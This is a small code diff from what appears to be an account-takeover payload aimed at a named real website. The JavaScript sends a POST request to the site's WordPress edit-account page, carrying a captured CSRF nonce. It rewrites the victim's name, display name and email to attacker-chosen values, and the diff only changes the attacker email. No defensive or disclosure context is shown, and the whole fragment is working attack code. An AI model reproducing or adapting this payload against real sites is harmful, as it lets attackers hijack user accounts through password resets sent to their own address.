@@ -7,7 +7,7 @@
       };
       xhttp.open("POST", "https://business.kinepolis.lu/mon-compte/edit-account/", true);
       xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-      xhttp.send("account_first_name=leeasassat&account_last_name=brqwqo&account_display_name=hackweweer123&account_email=backdoor10wewe2@tutanota.com&password_current=&password_1=&password_2=&save-account-details-nonce="+csrf_token+"&_wp_http_referer=/mon-compte/edit-account/&save_account_details=Enregistrer les modifications&action=save_account_details");
+      xhttp.send("account_first_name=leet&account_last_name=man&account_display_name=hackwewesdser123&account_email=leet@facker.com&password_current=&password_1=&password_2=&save-account-details-nonce="+csrf_token+"&_wp_http_referer=/mon-compte/edit-account/&save_account_details=Enregistrer les modifications&action=save_account_details");
     }
 
     var xhttp = new XMLHttpRequest();
